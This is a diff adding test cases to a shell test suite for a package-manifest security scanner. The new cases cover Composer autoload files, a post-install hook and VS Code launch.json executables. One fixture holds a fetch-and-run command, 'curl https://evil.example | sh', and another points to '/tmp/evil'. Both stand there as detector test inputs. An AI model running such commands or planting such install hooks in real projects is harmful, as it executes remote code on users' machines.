@@ -7564,6 +7564,43 @@ printf 'resource "aws_instance" "x" {\n  ami = "ami-123"\n}\n' \
     && check "file: plain terraform resource clean" "0" "0" \
     || check "file: plain terraform resource clean" "0" "1"
 rm -rf "$TDIR"
+# comp: composer autoload.files execute at require time
+PDIR=$(mktemp -d)
+printf '{"name":"x","autoload":{"files":["bootstrap.php"]}}\n' \
+    > "$PDIR/composer.json"
+./hlse_core package --manifest "$PDIR/composer.json" 2>&1 \
+    | grep -q "autoload.files" \
+    && check "pkg: composer autoload.files flagged" "0" "0" \
+    || check "pkg: composer autoload.files flagged" "0" "1"
+printf '{"name":"x","scripts":{"post-install-cmd":"curl https://evil.example | sh"}}\n' \
+    > "$PDIR/composer.json"
+./hlse_core package --manifest "$PDIR/composer.json" 2>&1 \
+    | grep -q "lifecycle" \
+    && check "pkg: composer post-install-cmd pipe flagged" "0" "0" \
+    || check "pkg: composer post-install-cmd pipe flagged" "0" "1"
+printf '{"name":"x","require":{"php":">=8"}}\n' \
+    > "$PDIR/composer.json"
+./hlse_core package --manifest "$PDIR/composer.json" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: plain composer.json clean" "0" "0" \
+    || check "pkg: plain composer.json clean" "0" "1"
+rm -rf "$PDIR"
+# launch.json joins vsc binary-path family
+VDIR=$(mktemp -d); mkdir -p "$VDIR/.vscode"
+printf '{"configurations":[{"runtimeExecutable":"/tmp/evil"}]}\n' \
+    > "$VDIR/.vscode/launch.json"
+./hlse_core package --manifest "$VDIR/.vscode/launch.json" 2>&1 \
+    | grep -q "binary key" \
+    && check "pkg: launch.json runtimeExecutable path flagged" "0" "0" \
+    || check "pkg: launch.json runtimeExecutable path flagged" "0" "1"
+printf '{"configurations":[{"program":"${workspaceFolder}/app.js"}]}\n' \
+    > "$VDIR/.vscode/launch.json"
+./hlse_core package --manifest "$VDIR/.vscode/launch.json" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: launch.json workspace program clean" "0" "0" \
+    || check "pkg: launch.json workspace program clean" "0" "1"
+rm -rf "$VDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
